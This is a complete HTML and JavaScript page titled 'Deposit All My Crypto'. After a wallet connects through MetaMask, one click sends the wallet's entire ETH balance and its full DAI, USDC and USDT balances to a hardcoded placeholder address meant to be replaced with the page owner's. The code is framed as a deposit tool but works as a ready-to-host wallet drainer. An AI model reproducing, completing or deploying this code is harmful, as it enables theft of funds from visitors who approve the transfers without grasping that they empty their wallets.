<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Deposit All My Crypto</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 2.5rem;
      color: #00ffd9;
      margin-bottom: 40px;
    }
    button {
      font-size: 1.2rem;
      padding: 15px 30px;
      margin: 10px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
      background: #00ffd9;
      color: #000;
      font-weight: bold;
    }
    button:hover {
      background: #00bfa5;
      transform: scale(1.05);
    }
    #status {
      margin-top: 20px;
      font-size: 1rem;
      color: #ffea00;
    }
  </style>
</head>
<body>
  <h1>ðŸš€ Deposit All My Crypto</h1>
  <button id="connect">ðŸ”Œ Connect Wallet</button>
  <button id="depositAll">ðŸ’¸ Deposit All</button>
  <div id="status"></div>

  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
  <script>
    window.onload = () => {
      const depositAddress = "0xYourWalletAddress"; // Replace with your address

      let provider, signer, userAddress;
      const status = document.getElementById("status");

      document.getElementById("connect").onclick = async () => {
        if (window.ethereum && window.ethereum.isMetaMask) {
          try {
            await ethereum.request({ method: "eth_requestAccounts" });
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            status.textContent = "Connected: " + userAddress;
          } catch (error) {
            console.error("Connection error:", error);
            status.textContent = "Connection failed: " + error.message;
            return;
          }
        } else {
          status.textContent = "MetaMask not detected. Please install MetaMask.";
        }
      };

      async function sendETH() {
        const balance = await provider.getBalance(userAddress);
        const gasReserve = ethers.utils.parseEther("0.002");
        const amountToSend = balance.sub(gasReserve);
        if (amountToSend.gt(0)) {
          const tx = await signer.sendTransaction({ to: depositAddress, value: amountToSend });
          await tx.wait();
        }
      }

      async function transferToken(tokenAddress) {
        const abi = [
          "function balanceOf(address) view returns (uint)",
          "function transfer(address to, uint amount) returns (bool)",
          "function decimals() view returns (uint8)"
        ];
        const token = new ethers.Contract(tokenAddress, abi, signer);
        const balance = await token.balanceOf(userAddress);
        if (balance.gt(0)) {
          const tx = await token.transfer(depositAddress, balance);
          await tx.wait();
        }
      }

      async function getTokenList() {
        return [
          "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
          "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
          "0xdAC17F958D2ee523a2206206994597C13D831ec7"  // USDT
        ];
      }

      document.getElementById("depositAll").onclick = async () => {
        if (!signer) {
          status.textContent = "Please connect wallet first.";
          return;
        }

        status.textContent = "Sending ETH and tokens...";

        await sendETH();

        const tokens = await getTokenList();
        for (let token of tokens) {
          try {
            await transferToken(token);
          } catch (e) {
            console.error("Token failed", token, e);
          }
        }

        status.textContent = "All assets attempted to deposit.";
      };
    };
  </script>
</body>
</html>
